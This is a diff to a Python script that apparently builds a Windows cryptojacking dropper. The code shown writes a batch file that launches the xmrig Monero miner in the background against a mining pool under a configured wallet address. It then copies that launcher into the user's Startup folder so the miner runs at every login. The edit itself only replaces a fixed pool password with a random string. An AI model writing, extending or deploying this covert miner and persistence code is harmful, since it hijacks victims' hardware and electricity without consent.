@@ -2,6 +2,7 @@ import subprocess
 import os
 import sys
 from bin.config import Config
+from bin._random_string import get_random_string
 
 cc = Config()
 
@@ -25,7 +26,7 @@ cd xmrig-6.21.0
 
 echo @echo off > start_xmrig.bat
 echo cd /d "%INSTALL_DIR%\\xmrig-6.21.0" >> start_xmrig.bat
-echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u {} -p fdaseaw -a rx/0 -k --background >> start_xmrig.bat
+echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u {} -p {} -a rx/0 -k --background >> start_xmrig.bat
 
 echo move /y "start_xmrig.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" > move_to_startup.bat
 call move_to_startup.bat
@@ -34,7 +35,7 @@ del move_to_startup.bat
 cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
 call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
 exit
-""".format(cc.get_xmr_adress())
+""".format(cc.get_xmr_adress(), get_random_string(12))
 
     batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")
 
